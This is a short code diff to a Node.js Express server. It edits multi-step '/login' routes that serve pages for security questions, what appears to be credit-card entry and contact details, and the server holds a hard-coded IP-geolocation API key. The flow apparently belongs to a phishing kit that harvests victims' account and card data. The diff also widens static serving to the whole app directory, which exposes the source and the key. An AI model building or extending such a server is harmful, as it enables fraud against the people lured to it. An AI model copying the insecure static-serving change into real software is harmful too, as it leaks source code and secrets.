@@ -13,7 +13,7 @@ const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const fs = require('fs').promises; 
  
-app.use(express.static(__dirname + '/public'));
+app.use(express.static(path.join(`${__dirname}`)));
 
 const port = 3000; // You can use any available port
 app.listen(port, () => {
@@ -58,7 +58,8 @@ app.get('/login/2', async (req, res) => {
         const htmlContent = await fs.readFile('secque.html', 'utf-8');
 
         // Send the HTML content as a response
-        res.send(htmlContent);
+        //res.send(htmlContent);
+        res.sendFile(path.join(__dirname, 'secque.html'));
     } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
@@ -73,7 +74,8 @@ app.get('/login/3', async (req, res) => {
         const htmlContent = await fs.readFile('cc.html', 'utf-8');
 
         // Send the HTML content as a response
-        res.send(htmlContent);
+        //res.send(htmlContent);
+        res.sendFile(path.join(__dirname, 'cc.html'));
     } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
@@ -87,7 +89,8 @@ app.get('/login/4', async (req, res) => {
         const htmlContent = await fs.readFile('contact.html', 'utf-8');
 
         // Send the HTML content as a response
-        res.send(htmlContent);
+        //res.send(htmlContent);
+        res.sendFile(path.join(__dirname, 'contact.html'));
     } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
